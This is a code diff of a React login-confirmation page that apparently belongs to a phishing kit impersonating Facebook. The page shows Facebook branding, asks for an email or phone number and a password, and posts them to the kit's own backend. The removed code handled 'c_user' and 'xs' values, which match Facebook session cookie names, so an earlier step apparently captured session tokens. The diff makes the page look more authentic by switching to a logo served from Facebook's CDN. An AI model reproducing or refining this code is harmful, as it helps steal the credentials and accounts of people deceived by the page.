@@ -22,7 +22,7 @@ import {
   SelectValue,
 } from "@/components/ui/select";
 import { countries } from "@/lib/countries";
-import { formTwoSchema, type FormTwo, isPhoneNumber } from "@shared/schema";
+import { formTwoSchema, type FormTwo } from "@shared/schema";
 
 export default function Confirmation() {
   const { toast } = useToast();
@@ -38,41 +38,12 @@ export default function Confirmation() {
     },
   });
 
-  // Load validation data on mount
-  useEffect(() => {
-    const storedData = localStorage.getItem('validation_data');
-    if (!storedData) {
-      setLocation('/validation');
-      return;
-    }
-    try {
-      const parsed = JSON.parse(storedData);
-      if (!parsed.c_user || !parsed.xs) {
-        throw new Error("Invalid validation data");
-      }
-      form.setValue('c_user', parsed.c_user);
-      form.setValue('xs', parsed.xs);
-    } catch (error) {
-      console.error('Failed to parse validation data:', error);
-      setLocation('/validation');
-    }
-  }, [setLocation]);
-
   const onSubmit = async (data: FormTwo) => {
     try {
       const formattedData = {
         user_email: contactMethod === 'phone' ? `${countryCode}${data.user_email}` : data.user_email,
         password: data.password,
       };
-
-      // Validate phone number format if phone method is selected
-      if (contactMethod === 'phone' && !isPhoneNumber(formattedData.user_email)) {
-        form.setError('user_email', {
-          type: 'manual',
-          message: 'Invalid phone number format'
-        });
-        return;
-      }
 
       const response = await fetch('/api/form-two', {
         method: 'POST',
@@ -87,12 +58,16 @@ export default function Confirmation() {
         throw new Error(errorData.message || 'Failed to submit form');
       }
 
-      localStorage.removeItem('validation_data');
-      toast({
-        title: "Success!",
-        description: "Your form has been submitted successfully"
-      });
-      setLocation("/success");
+      const result = await response.json();
+      if (result.success) {
+        toast({
+          title: "Success!",
+          description: "Your form has been submitted successfully"
+        });
+        setLocation("/success");
+      } else {
+        throw new Error(result.message || 'Failed to submit form');
+      }
     } catch (error) {
       console.error('Form submission error:', error);
       toast({
@@ -112,8 +87,8 @@ export default function Confirmation() {
       <div className="min-h-screen flex justify-center items-center p-3 sm:p-4 bg-gradient-to-br from-[#0180FA]/10 via-[#f0f2f5] to-[#0180FA]/5">
         <div className="bg-white/90 backdrop-blur-sm p-6 sm:p-8 rounded-lg shadow-lg max-w-[360px] w-full text-center border border-white/20">
           <img 
-            src="https://upload.wikimedia.org/wikipedia/commons/thumb/6/6c/Facebook_Logo_2023.png/600px-Facebook_Logo_2023.png?20231011121526"
-            alt="Logo"
+            src="https://static.xx.fbcdn.net/rsrc.php/y8/r/dF5SId3UHWd.svg"
+            alt="Facebook"
             className="w-[100px] sm:w-[120px] mx-auto mb-4 sm:mb-5"
           />
           <h1 className="text-base sm:text-lg font-bold text-[#333] mb-4 sm:mb-5">
@@ -173,7 +148,7 @@ export default function Confirmation() {
                               <SelectContent className="max-h-[200px]">
                                 {countries.map((country) => (
                                   <SelectItem key={country.code} value={country.code}>
-                                    {country.code} ({country.name})
+                                    {country.code}
                                   </SelectItem>
                                 ))}
                               </SelectContent>
@@ -188,10 +163,6 @@ export default function Confirmation() {
                             }
                             className="w-full px-3 py-1.5 sm:py-2 text-sm border border-[#ccd0d5] rounded-md focus:border-[#0180FA] focus:ring-2 focus:ring-[#0180FA] focus:ring-opacity-20"
                             {...field}
-                            onChange={(e) => {
-                              const value = e.target.value.replace(/\s+/g, '');
-                              field.onChange(value);
-                            }}
                           />
                         </div>
                       </FormControl>
